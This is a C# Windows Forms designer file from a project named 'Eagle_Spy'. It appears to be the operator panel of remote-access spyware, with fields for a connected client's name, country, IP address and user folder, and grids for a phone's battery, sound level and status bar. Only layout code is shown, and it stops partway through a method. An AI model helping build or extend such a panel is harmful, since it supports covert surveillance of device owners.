using System;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Eagle_Spy.sockets;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy;

[DesignerGenerated]
public class information : Form
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DGV3")]
	private DataGridView _DGV3;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DGV2")]
	private DataGridView _DGV2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DGV1")]
	private DataGridView _DGV1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DGV0")]
	private DataGridView _DGV0;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DGV4")]
	private DataGridView _DGV4;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DGV5")]
	private DataGridView _DGV5;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DGV6")]
	private DataGridView _DGV6;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TOpacity")]
	private System.Windows.Forms.Timer _TOpacity;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("SaveToolStripMenuItem")]
	private ToolStripMenuItem _SaveToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("SaveAsToolStripMenuItem")]
	private ToolStripMenuItem _SaveAsToolStripMenuItem;

	public TcpClient Client;

	public Client classClient;

	public string Title;

	private ComboBox LastComboDGV5;

	private ComboBox LastComboDGV6;

	private DataGridViewCellCancelEventArgs EventArgs;

	private string EventName;

	public DataTable tmpTable;

	public string tmpFolderUSER;

	public string tmpClientName;

	public string tmpCountry;

	public string tmpAddressIP;

	public DataSet DS;

	[field: AccessedThroughProperty("Panel1")]
	internal Panel Panel1
	;

	internal DataGridView DGV3
;

	[field: AccessedThroughProperty("LB4")]
	internal Label LB4
	;

	internal DataGridView DGV2
	;

	[field: AccessedThroughProperty("LB3")]
	internal Label LB3
    ;

	internal DataGridView DGV1
;


	[field: AccessedThroughProperty("LB2")]
	internal Label LB2
;

	internal DataGridView DGV0
	;

	[field: AccessedThroughProperty("LB1")]
	internal Label LB1
    ;

	internal DataGridView DGV4
	;

	[field: AccessedThroughProperty("LB5")]
	internal Label LB5
    ;

	internal DataGridView DGV5
	;

	[field: AccessedThroughProperty("LB6")]
	internal Label LB6
    ;

	internal DataGridView DGV6
	;

	[field: AccessedThroughProperty("LB7")]
	internal Label LB7
    ;

	internal System.Windows.Forms.Timer TOpacity
;

	[field: AccessedThroughProperty("DataGridViewTextBoxColumn6")]
	internal DataGridViewTextBoxColumn DataGridViewTextBoxColumn6
;

    [field: AccessedThroughProperty("DataGridViewComboBoxColumn1")]
	internal DataGridViewComboBoxColumn DataGridViewComboBoxColumn1
    ;

    [field: AccessedThroughProperty("DataGridViewTextBoxColumn5")]
	internal DataGridViewTextBoxColumn DataGridViewTextBoxColumn5
    ;

    [field: AccessedThroughProperty("DataGridViewComboBoxColumn3")]
	internal DataGridViewComboBoxColumn DataGridViewComboBoxColumn3
    ;

    [field: AccessedThroughProperty("DataGridViewTextBoxColumn4")]
	internal DataGridViewTextBoxColumn DataGridViewTextBoxColumn4
    ;

    [field: AccessedThroughProperty("Column3")]
	internal DataGridViewTextBoxColumn Column3
    ;

    [field: AccessedThroughProperty("DataGridViewTextBoxColumn3")]
	internal DataGridViewTextBoxColumn DataGridViewTextBoxColumn3
    ;

    [field: AccessedThroughProperty("Column4")]
	internal DataGridViewTextBoxColumn Column4
    ;

    [field: AccessedThroughProperty("DataGridViewTextBoxColumn2")]
	internal DataGridViewTextBoxColumn DataGridViewTextBoxColumn2
    ;

    [field: AccessedThroughProperty("Column5")]
	internal DataGridViewTextBoxColumn Column5
    ;

    [field: AccessedThroughProperty("DataGridViewTextBoxColumn1")]
	internal DataGridViewTextBoxColumn DataGridViewTextBoxColumn1
    ;

    [field: AccessedThroughProperty("Column6")]
	internal DataGridViewTextBoxColumn Column6
    ;

    [field: AccessedThroughProperty("Column1")]
	internal DataGridViewTextBoxColumn Column1
    ;

    [field: AccessedThroughProperty("Column2")]
	internal DataGridViewTextBoxColumn Column2
;

    [field: AccessedThroughProperty("ctxMenu")]
	internal ContextMenuStrip ctxMenu
    ;
	internal ToolStripMenuItem SaveToolStripMenuItem
;

	internal ToolStripMenuItem SaveAsToolStripMenuItem
	;

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
				components.Dispose();
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle5 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle6 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle7 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle8 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle9 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle10 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle11 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle12 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle13 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle14 = new System.Windows.Forms.DataGridViewCellStyle();
		this.Panel1 = new System.Windows.Forms.Panel();
		this.DGV6 = new System.Windows.Forms.DataGridView();
		this.DataGridViewTextBoxColumn6 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.DataGridViewComboBoxColumn1 = new System.Windows.Forms.DataGridViewComboBoxColumn();
		this.LB7 = new System.Windows.Forms.Label();
		this.DGV5 = new System.Windows.Forms.DataGridView();
		this.DataGridViewTextBoxColumn5 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.DataGridViewComboBoxColumn3 = new System.Windows.Forms.DataGridViewComboBoxColumn();
		this.LB6 = new System.Windows.Forms.Label();
		this.DGV4 = new System.Windows.Forms.DataGridView();
		this.DataGridViewTextBoxColumn4 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column3 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.LB5 = new System.Windows.Forms.Label();
		this.DGV3 = new System.Windows.Forms.DataGridView();
		this.DataGridViewTextBoxColumn3 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column4 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.LB4 = new System.Windows.Forms.Label();
		this.DGV2 = new System.Windows.Forms.DataGridView();
		this.DataGridViewTextBoxColumn2 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column5 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.LB3 = new System.Windows.Forms.Label();
		this.DGV1 = new System.Windows.Forms.DataGridView();
		this.DataGridViewTextBoxColumn1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column6 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.LB2 = new System.Windows.Forms.Label();
		this.DGV0 = new System.Windows.Forms.DataGridView();
		this.Column1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column2 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.LB1 = new System.Windows.Forms.Label();
		this.TOpacity = new System.Windows.Forms.Timer(this.components);
		this.ctxMenu = new System.Windows.Forms.ContextMenuStrip(this.components);
		this.SaveToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.SaveAsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.Panel1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.DGV6).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.DGV5).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.DGV4).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.DGV3).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.DGV2).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.DGV1).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.DGV0).BeginInit();
		this.ctxMenu.SuspendLayout();
		base.SuspendLayout();



        DGV3.CellEnter += new DataGridViewCellEventHandler(DGV3_CellEnter);
        DGV2.CellEnter += new DataGridViewCellEventHandler(DGV2_CellEnter);
        DGV1.CellEnter += new DataGridViewCellEventHandler(DGV1_CellEnter);
        DGV0.CellEnter += new DataGridViewCellEventHandler(DGV0_CellEnter);
        DGV4.CellEnter += new DataGridViewCellEventHandler(DGV4_CellEnter);
        DGV5.CellEnter += new DataGridViewCellEventHandler(DGV5_CellEnter);
        DGV5.CellBeginEdit += new DataGridViewCellCancelEventHandler(DGV5_CellBeginEdit);
        DGV5.EditingControlShowing += new DataGridViewEditingControlShowingEventHandler(DGV5_EditingControlShowing);
        DGV6.CellEnter += new DataGridViewCellEventHandler(DGV6_CellEnter);
        DGV6.CellBeginEdit += new DataGridViewCellCancelEventHandler(DGV6_CellBeginEdit);
        DGV6.EditingControlShowing += new DataGridViewEditingControlShowingEventHandler(DGV6_EditingControlShowing);
        TOpacity.Tick += new EventHandler(TOpacity_Tick);
        SaveToolStripMenuItem.Click += new EventHandler(SaveToolStripMenuItem_Click);
        SaveAsToolStripMenuItem.Click += new EventHandler(SaveAsToolStripMenuItem_Click);


















































































        this.Panel1.AutoScroll = true;
		this.Panel1.BackColor = System.Drawing.Color.Black;
		this.Panel1.Controls.Add(this.DGV6);
		this.Panel1.Controls.Add(this.LB7);
		this.Panel1.Controls.Add(this.DGV5);
		this.Panel1.Controls.Add(this.LB6);
		this.Panel1.Controls.Add(this.DGV4);
		this.Panel1.Controls.Add(this.LB5);
		this.Panel1.Controls.Add(this.DGV3);
		this.Panel1.Controls.Add(this.LB4);
		this.Panel1.Controls.Add(this.DGV2);
		this.Panel1.Controls.Add(this.LB3);
		this.Panel1.Controls.Add(this.DGV1);
		this.Panel1.Controls.Add(this.LB2);
		this.Panel1.Controls.Add(this.DGV0);
		this.Panel1.Controls.Add(this.LB1);
		this.Panel1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel1.Location = new System.Drawing.Point(0, 0);
		this.Panel1.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.Panel1.Name = "Panel1";
		this.Panel1.Size = new System.Drawing.Size(513, 663);
		this.Panel1.TabIndex = 2;
		this.DGV6.AllowUserToAddRows = false;
		this.DGV6.AllowUserToDeleteRows = false;
		this.DGV6.AllowUserToResizeColumns = false;
		this.DGV6.AllowUserToResizeRows = false;
		this.DGV6.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
		this.DGV6.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		this.DGV6.BackgroundColor = System.Drawing.Color.FromArgb(10, 10, 10);
		this.DGV6.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.DGV6.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.DGV6.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle.Font = new System.Drawing.Font("Calibri", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		dataGridViewCellStyle.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle.SelectionBackColor = System.Drawing.SystemColors.Highlight;
		dataGridViewCellStyle.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
		dataGridViewCellStyle.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV6.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle;
		this.DGV6.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
		this.DGV6.ColumnHeadersVisible = false;
		this.DGV6.Columns.AddRange(this.DataGridViewTextBoxColumn6, this.DataGridViewComboBoxColumn1);
		dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle2.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle2.Font = new System.Drawing.Font("Calibri", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		dataGridViewCellStyle2.ForeColor = System.Drawing.Color.FromArgb(190, 190, 190);
		dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.FromArgb(51, 153, 255);
		dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.Black;
		dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.DGV6.DefaultCellStyle = dataGridViewCellStyle2;
		this.DGV6.Dock = System.Windows.Forms.DockStyle.Top;
		this.DGV6.EditMode = System.Windows.Forms.DataGridViewEditMode.EditOnEnter;
		this.DGV6.EnableHeadersVisualStyles = false;
		this.DGV6.GridColor = System.Drawing.Color.FromArgb(42, 42, 42);
		this.DGV6.Location = new System.Drawing.Point(0, 1128);
		this.DGV6.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.DGV6.Name = "DGV6";
		this.DGV6.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
		this.DGV6.RowHeadersVisible = false;
		this.DGV6.ScrollBars = System.Windows.Forms.ScrollBars.None;
		this.DGV6.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.DGV6.Size = new System.Drawing.Size(492, 166);
		this.DGV6.TabIndex = 16;
		this.DataGridViewTextBoxColumn6.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.DataGridViewTextBoxColumn6.FillWeight = 50f;
		this.DataGridViewTextBoxColumn6.HeaderText = "Property";
		this.DataGridViewTextBoxColumn6.Name = "DataGridViewTextBoxColumn6";
		this.DataGridViewTextBoxColumn6.ReadOnly = true;
		this.DataGridViewTextBoxColumn6.SortMode = System.Windows.Forms.DataGridViewColumnSortMode.NotSortable;
		this.DataGridViewComboBoxColumn1.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.DataGridViewComboBoxColumn1.DisplayStyle = System.Windows.Forms.DataGridViewComboBoxDisplayStyle.ComboBox;
		this.DataGridViewComboBoxColumn1.DisplayStyleForCurrentCellOnly = true;
		this.DataGridViewComboBoxColumn1.FillWeight = 50f;
		this.DataGridViewComboBoxColumn1.FlatStyle = System.Windows.Forms.FlatStyle.System;
		this.DataGridViewComboBoxColumn1.HeaderText = "value";
		this.DataGridViewComboBoxColumn1.Name = "DataGridViewComboBoxColumn1";
		this.DataGridViewComboBoxColumn1.Resizable = System.Windows.Forms.DataGridViewTriState.False;
		this.LB7.BackColor = System.Drawing.Color.Black;
		this.LB7.Dock = System.Windows.Forms.DockStyle.Top;
		this.LB7.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.LB7.ForeColor = System.Drawing.Color.FromArgb(254, 0, 0);
		this.LB7.Location = new System.Drawing.Point(0, 1098);
		this.LB7.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.LB7.Name = "LB7";
		this.LB7.Padding = new System.Windows.Forms.Padding(0, 0, 0, 5);
		this.LB7.Size = new System.Drawing.Size(492, 30);
		this.LB7.TabIndex = 15;
		this.LB7.Text = "Phone bar";
		this.LB7.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.DGV5.AllowUserToAddRows = false;
		this.DGV5.AllowUserToDeleteRows = false;
		this.DGV5.AllowUserToResizeColumns = false;
		this.DGV5.AllowUserToResizeRows = false;
		this.DGV5.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
		this.DGV5.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		this.DGV5.BackgroundColor = System.Drawing.Color.FromArgb(10, 10, 10);
		this.DGV5.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.DGV5.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.DGV5.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle3.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle3.Font = new System.Drawing.Font("Calibri", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		dataGridViewCellStyle3.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle3.SelectionBackColor = System.Drawing.SystemColors.Highlight;
		dataGridViewCellStyle3.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
		dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV5.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle3;
		this.DGV5.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
		this.DGV5.ColumnHeadersVisible = false;
		this.DGV5.Columns.AddRange(this.DataGridViewTextBoxColumn5, this.DataGridViewComboBoxColumn3);
		dataGridViewCellStyle4.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle4.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle4.Font = new System.Drawing.Font("Calibri", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		dataGridViewCellStyle4.ForeColor = System.Drawing.Color.FromArgb(190, 190, 190);
		dataGridViewCellStyle4.SelectionBackColor = System.Drawing.Color.FromArgb(51, 153, 255);
		dataGridViewCellStyle4.SelectionForeColor = System.Drawing.Color.Black;
		dataGridViewCellStyle4.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.DGV5.DefaultCellStyle = dataGridViewCellStyle4;
		this.DGV5.Dock = System.Windows.Forms.DockStyle.Top;
		this.DGV5.EditMode = System.Windows.Forms.DataGridViewEditMode.EditOnEnter;
		this.DGV5.EnableHeadersVisualStyles = false;
		this.DGV5.GridColor = System.Drawing.Color.FromArgb(42, 42, 42);
		this.DGV5.Location = new System.Drawing.Point(0, 981);
		this.DGV5.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.DGV5.Name = "DGV5";
		this.DGV5.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
		this.DGV5.RowHeadersVisible = false;
		this.DGV5.ScrollBars = System.Windows.Forms.ScrollBars.None;
		this.DGV5.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.DGV5.Size = new System.Drawing.Size(492, 117);
		this.DGV5.TabIndex = 14;
		this.DataGridViewTextBoxColumn5.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.DataGridViewTextBoxColumn5.FillWeight = 50f;
		this.DataGridViewTextBoxColumn5.HeaderText = "Property";
		this.DataGridViewTextBoxColumn5.Name = "DataGridViewTextBoxColumn5";
		this.DataGridViewTextBoxColumn5.ReadOnly = true;
		this.DataGridViewTextBoxColumn5.SortMode = System.Windows.Forms.DataGridViewColumnSortMode.NotSortable;
		this.DataGridViewComboBoxColumn3.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.DataGridViewComboBoxColumn3.DisplayStyle = System.Windows.Forms.DataGridViewComboBoxDisplayStyle.ComboBox;
		this.DataGridViewComboBoxColumn3.DisplayStyleForCurrentCellOnly = true;
		this.DataGridViewComboBoxColumn3.FillWeight = 50f;
		this.DataGridViewComboBoxColumn3.FlatStyle = System.Windows.Forms.FlatStyle.System;
		this.DataGridViewComboBoxColumn3.HeaderText = "value";
		this.DataGridViewComboBoxColumn3.Name = "DataGridViewComboBoxColumn3";
		this.DataGridViewComboBoxColumn3.Resizable = System.Windows.Forms.DataGridViewTriState.False;
		this.LB6.BackColor = System.Drawing.Color.Black;
		this.LB6.Dock = System.Windows.Forms.DockStyle.Top;
		this.LB6.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.LB6.ForeColor = System.Drawing.Color.FromArgb(254, 0, 0);
		this.LB6.Location = new System.Drawing.Point(0, 951);
		this.LB6.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.LB6.Name = "LB6";
		this.LB6.Padding = new System.Windows.Forms.Padding(0, 0, 0, 5);
		this.LB6.Size = new System.Drawing.Size(492, 30);
		this.LB6.TabIndex = 13;
		this.LB6.Text = "Sound level";
		this.LB6.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.DGV4.AllowUserToAddRows = false;
		this.DGV4.AllowUserToDeleteRows = false;
		this.DGV4.AllowUserToResizeColumns = false;
		this.DGV4.AllowUserToResizeRows = false;
		this.DGV4.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
		this.DGV4.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		this.DGV4.BackgroundColor = System.Drawing.Color.FromArgb(10, 10, 10);
		this.DGV4.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.DGV4.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.DGV4.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle5.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle5.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle5.Font = new System.Drawing.Font("Calibri", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		dataGridViewCellStyle5.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle5.SelectionBackColor = System.Drawing.SystemColors.Highlight;
		dataGridViewCellStyle5.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
		dataGridViewCellStyle5.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV4.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle5;
		this.DGV4.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
		this.DGV4.ColumnHeadersVisible = false;
		this.DGV4.Columns.AddRange(this.DataGridViewTextBoxColumn4, this.Column3);
		dataGridViewCellStyle6.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle6.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle6.Font = new System.Drawing.Font("Calibri", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		dataGridViewCellStyle6.ForeColor = System.Drawing.Color.FromArgb(190, 190, 190);
		dataGridViewCellStyle6.SelectionBackColor = System.Drawing.Color.FromArgb(51, 153, 255);
		dataGridViewCellStyle6.SelectionForeColor = System.Drawing.Color.Black;
		dataGridViewCellStyle6.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.DGV4.DefaultCellStyle = dataGridViewCellStyle6;
		this.DGV4.Dock = System.Windows.Forms.DockStyle.Top;
		this.DGV4.EditMode = System.Windows.Forms.DataGridViewEditMode.EditOnEnter;
		this.DGV4.EnableHeadersVisualStyles = false;
		this.DGV4.GridColor = System.Drawing.Color.FromArgb(42, 42, 42);
		this.DGV4.Location = new System.Drawing.Point(0, 827);
		this.DGV4.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.DGV4.Name = "DGV4";
		this.DGV4.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
		this.DGV4.RowHeadersVisible = false;
		this.DGV4.ScrollBars = System.Windows.Forms.ScrollBars.None;
		this.DGV4.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.DGV4.Size = new System.Drawing.Size(492, 124);
		this.DGV4.TabIndex = 12;
		this.DataGridViewTextBoxColumn4.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.DataGridViewTextBoxColumn4.FillWeight = 50f;
		this.DataGridViewTextBoxColumn4.HeaderText = "Property";
		this.DataGridViewTextBoxColumn4.Name = "DataGridViewTextBoxColumn4";
		this.DataGridViewTextBoxColumn4.ReadOnly = true;
		this.DataGridViewTextBoxColumn4.SortMode = System.Windows.Forms.DataGridViewColumnSortMode.NotSortable;
		this.Column3.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.Column3.FillWeight = 50f;
		this.Column3.HeaderText = "value";
		this.Column3.Name = "Column3";
		this.Column3.Resizable = System.Windows.Forms.DataGridViewTriState.False;
		this.LB5.BackColor = System.Drawing.Color.Black;
		this.LB5.Dock = System.Windows.Forms.DockStyle.Top;
		this.LB5.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.LB5.ForeColor = System.Drawing.Color.FromArgb(254, 0, 0);
		this.LB5.Location = new System.Drawing.Point(0, 797);
		this.LB5.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.LB5.Name = "LB5";
		this.LB5.Padding = new System.Windows.Forms.Padding(0, 0, 0, 5);
		this.LB5.Size = new System.Drawing.Size(492, 30);
		this.LB5.TabIndex = 11;
		this.LB5.Text = "Battery";
		this.LB5.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.DGV3.AllowUserToAddRows = false;
		this.DGV3.AllowUserToDeleteRows = false;
		this.DGV3.AllowUserToResizeColumns = false;
		this.DGV3.AllowUserToResizeRows = false;
		this.DGV3.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
		this.DGV3.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		this.DGV3.BackgroundColor = System.Drawing.Color.FromArgb(10, 10, 10);
		this.DGV3.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.DGV3.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.DGV3.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle7.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle7.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle7.Font = new System.Drawing.Font("Calibri", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		dataGridViewCellStyle7.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle7.SelectionBackColor = System.Drawing.SystemColors.Highlight;
		dataGridViewCellStyle7.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
		dataGridViewCellStyle7.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV3.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle7;
		this.DGV3.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
		this.DGV3.ColumnHeadersVisible = false;
		this.DGV3.Columns.AddRange(this.DataGridViewTextBoxColumn3, this.Column4);
		dataGridViewCellStyle8.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle8.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle8.Font = new System.Drawing.Font("Calibri", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		dataGridViewCellStyle8.ForeColor = System.Drawing.Color.FromArgb(190, 190, 190);
		dataGridViewCellStyle8.SelectionBackColor = System.Drawing.Color.FromArgb(51, 153, 255);
		dataGridViewCellStyle8.SelectionForeColor = System.Drawing.Color.Black;
		dataGridViewCellStyle8.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.DGV3.DefaultCellStyle = dataGridViewCellStyle8;
